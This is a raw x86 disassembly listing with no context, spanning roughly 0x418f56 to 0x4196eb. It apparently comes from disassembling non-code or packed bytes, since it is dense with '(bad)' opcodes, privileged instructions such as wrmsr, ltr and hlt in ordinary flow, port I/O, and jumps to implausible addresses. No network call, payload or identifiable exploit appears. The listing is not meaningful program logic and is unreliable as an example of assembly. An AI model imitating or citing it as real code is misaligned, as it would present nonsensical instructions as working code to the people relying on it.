  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
